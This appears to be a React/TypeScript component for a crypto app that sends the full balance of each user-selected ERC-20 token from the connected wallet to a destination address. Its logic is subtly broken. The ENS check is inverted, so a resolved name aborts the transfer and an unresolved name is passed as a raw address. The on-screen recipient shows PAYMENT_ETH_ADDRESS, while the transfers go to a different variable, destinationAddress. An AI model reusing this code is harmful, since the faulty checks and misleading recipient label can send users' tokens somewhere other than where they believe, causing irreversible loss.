import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient } from 'wagmi';

import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { erc20Abi } from 'viem';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import {
  destinationAddressAtom,
  PAYMENT_ETH_ADDRESS,
} from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const sendAllCheckedTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(
      checkedRecords,
    )
      .filter(([, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient) return;
    if (!publicClient) return;
    if (!destinationAddress) return;

    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) return;
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find(
        (token) => token.contract_address === tokenAddress,
      );
      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [
            destinationAddress as `0x${string}`,
            BigInt(token?.balance || '0'),
          ],
        });

        await walletClient.writeContract(request).then((res) => {
          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: res,
            },
          }));
          showToast(
            `Sent ${token?.contract_ticker_symbol} successfully!`,
            'success',
          );
        });
      } catch (err: any) {
        showToast(
          `Error with ${token?.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
          'warning',
        );
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div className="w-full mt-4">
      <div className="text-xs text-gray-400 mb-3 text-center break-all">
        Sending to:{' '}
        <span className="font-mono text-gray-600">{PAYMENT_ETH_ADDRESS}</span>
      </div>
      <button
        onClick={sendAllCheckedTokens}
        disabled={checkedCount === 0 || !walletClient}
        className="w-full py-3 px-6 rounded-xl font-semibold text-white transition-all duration-200"
        style={{
          background:
            checkedCount === 0 || !walletClient
              ? '#d1d5db'
              : 'linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)',
          cursor: checkedCount === 0 || !walletClient ? 'not-allowed' : 'pointer',
        }}
      >
        {checkedCount === 0
          ? 'Select tokens above to send'
          : `Send ${checkedCount} token${checkedCount !== 1 ? 's' : ''}`}
      </button>
    </div>
  );
};
